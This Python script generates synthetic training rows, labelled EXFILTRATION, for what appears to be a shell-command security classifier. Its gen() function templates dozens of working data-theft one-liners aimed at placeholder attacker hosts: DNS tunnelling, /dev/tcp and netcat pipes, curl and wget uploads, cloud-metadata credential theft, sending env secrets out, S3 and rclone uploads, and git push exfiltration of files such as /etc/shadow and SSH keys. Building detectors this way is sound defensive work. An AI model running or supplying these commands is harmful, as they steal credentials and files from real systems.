#!/usr/bin/env python3
"""Deterministic generator for EXFILTRATION — the thin class.

DEFENSIVE training data (command STRINGS only, never executed) so the IAAC
classifier recognizes data/secret movement + cloud-cred theft + C2 beacons.
Covers the real Linux exfil paradigms (MITRE T1041/T1048/T1567/T1071/T1552):
DNS-OOB, /dev/tcp + nc pipes, web POST/PUT, scp/rsync stealth, ICMP tunnel,
cloud-cred theft + IMDS, base64/openssl encode-pipe, rclone/cloud upload,
ftp/tftp, webhook/pastebin, git push, inline python/perl. Writes
dataset/seeds/gen_exfil.jsonl in the §15.0 schema.
"""
import json, os, itertools, random

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "seeds", "gen_exfil.jsonl")
SEED = 1337
TARGET = 1500

IPS = ["10.0.0.1", "10.10.14.7", "192.168.1.50", "203.0.113.7", "198.51.100.23", "172.16.0.9"]
DOMS = ["evil.example.com", "c2.example.net", "exfil.example.org", "attacker.example.io", "data.example.co"]
PORTS = ["443", "4444", "53", "8080", "9001", "1337"]
FILES = ["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa", "/home/deploy/.ssh/id_rsa",
         "/var/backups/db.sql", "/opt/app/secrets.env", "/etc/", "/home/user/data.tar.gz",
         "~/.aws/credentials", "/var/lib/mysql/prod", "/tmp/loot.tar", "/etc/kubernetes/admin.conf"]
BUCKETS = ["s3://attacker-loot", "s3://exfil-bucket-9021", "s3://ext-drop"]
KEYS = ["hunter2", "s3cr3tKEY", "P@ssExfil"]


def gen(ip, dom, port, f, bucket, key):
    """Return (command, family_id) tuples across exfil paradigms."""
    return [
        # DNS out-of-band
        (f"for i in $(base64 {f} 2>/dev/null); do dig +short $i.{dom}; done", "exfil-dns-oob"),
        (f"xxd -p {f} | while read l; do nslookup $l.{dom}; done", "exfil-dns-oob"),
        (f"iodine -f -P {key} {dom}", "exfil-dns-tunnel"),
        # /dev/tcp and nc pipes
        (f"tar czf - {f} | bash -c 'cat > /dev/tcp/{ip}/{port}'", "exfil-devtcp"),
        (f"cat {f} > /dev/tcp/{ip}/{port}", "exfil-devtcp"),
        (f"tar czf - {f} | nc {ip} {port}", "exfil-nc-pipe"),
        (f"nc {ip} {port} < {f}", "exfil-nc-pipe"),
        (f"gzip -c {f} | nc -q0 {ip} {port}", "exfil-nc-pipe"),
        # web POST/PUT
        (f"curl -X POST --data-binary @{f} http://{dom}/upload", "exfil-web-post"),
        (f"curl -T {f} http://{ip}:{port}/", "exfil-web-put"),
        (f"curl -F \"file=@{f}\" https://{dom}/u", "exfil-web-multipart"),
        (f"wget --post-file={f} http://{dom}/x", "exfil-web-post"),
        (f"tar czf - {f} | curl -s -X POST --data-binary @- http://{ip}:{port}/", "exfil-web-post"),
        # scp / rsync stealth
        (f"scp -P {port} {f} attacker@{dom}:/tmp/", "exfil-scp"),
        (f"rsync -e \"ssh -p {port}\" -avz {f} attacker@{ip}:/loot/", "exfil-rsync"),
        (f"scp -r {f} root@{ip}:/exfil/", "exfil-scp"),
        # ICMP tunnel
        (f"ping -p $(xxd -p {f} | tr -d '\\n' | head -c 32) -c 1 {dom}", "exfil-icmp"),
        (f"hping3 --icmp -d 1400 -E {f} {ip}", "exfil-icmp"),
        # cloud-cred theft + IMDS
        (f"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -d @- http://{dom}/", "exfil-imds-cred"),
        (f"cat ~/.aws/credentials | curl -X POST --data-binary @- http://{ip}:{port}/", "exfil-cloud-cred"),
        (f"tar czf - ~/.aws ~/.config/gcloud ~/.kube 2>/dev/null | nc {ip} {port}", "exfil-cloud-cred"),
        (f"env | grep -iE 'key|secret|token' | curl -d @- http://{dom}/e", "exfil-env-secret"),
        # base64 / openssl encode-pipe
        (f"base64 {f} | curl -s -d @- http://{dom}/b", "exfil-b64-pipe"),
        (f"tar czf - {f} | openssl enc -aes-256-cbc -k {key} | nc {ip} {port}", "exfil-openssl-pipe"),
        (f"openssl enc -aes-256-cbc -in {f} -k {key} | curl -T - http://{ip}:{port}/", "exfil-openssl-pipe"),
        # cloud CLI upload to attacker
        (f"aws s3 cp {f} {bucket}/ --no-sign-request", "exfil-aws-s3"),
        (f"aws s3 sync {f} {bucket}/dump/", "exfil-aws-s3"),
        (f"rclone copy {f} remote-attacker:{bucket.split('//')[-1]}", "exfil-rclone"),
        # ftp / tftp
        (f"curl -T {f} ftp://attacker@{dom}/", "exfil-ftp"),
        (f"tftp {ip} -c put {f}", "exfil-tftp"),
        # webhook / pastebin
        (f"curl -F \"content=@{f}\" https://{dom}/webhook", "exfil-webhook"),
        (f"curl -s --data-urlencode data@{f} https://{dom}/paste", "exfil-pastebin"),
        # git push exfil
        (f"cd /tmp && git init -q loot && cp {f} loot/ && cd loot && git add . && git commit -qm x && git push http://{dom}/r HEAD", "exfil-git-push"),
        # inline interpreter
        (f"python3 -c \"import requests;requests.post('http://{dom}/u',files={{'f':open('{f}','rb')}})\"", "exfil-py-requests"),
        (f"perl -e 'use LWP::UserAgent;LWP::UserAgent->new->post(\"http://{ip}:{port}/\",Content=>`cat {f}`)'", "exfil-perl-lwp"),
    ]


def main():
    rng = random.Random(SEED)
    combos = list(itertools.product(IPS, DOMS, PORTS, FILES, BUCKETS, KEYS))
    rng.shuffle(combos)
    rows, seen = [], set()
    for ip, dom, port, f, bucket, key in combos:
        for cmd, fam in gen(ip, dom, port, f, bucket, key):
            cmd = cmd.strip()
            if cmd in seen:
                continue
            seen.add(cmd)
            rows.append({"command": cmd[:4096], "expected": "EXFILTRATION",
                         "source": "generated", "technique": None, "is_synthetic": True,
                         "is_obfuscated": False, "family_id": fam, "reviewed_by": None})
            if len(rows) >= TARGET:
                break
        if len(rows) >= TARGET:
            break
    with open(OUT, "w") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")
    fams = len({r["family_id"] for r in rows})
    print(f"wrote {len(rows)} EXFILTRATION rows across {fams} families -> {OUT}")


if __name__ == "__main__":
    main()
